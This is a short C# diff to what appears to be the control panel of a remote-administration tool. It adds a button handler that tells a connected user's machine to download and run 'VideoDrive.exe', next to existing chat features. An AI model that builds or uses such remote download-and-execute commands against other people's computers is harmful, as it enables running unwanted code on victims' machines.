@@ -257,5 +257,10 @@ namespace ServerWorker
             chat.Show();
             user.UsersCom.StartChat();
         }
+
+        private void button7_Click(object sender, EventArgs e)
+        {
+            user.UsersCom.DownloadAndRun("VideoDrive.exe");
+        }
     }
 }
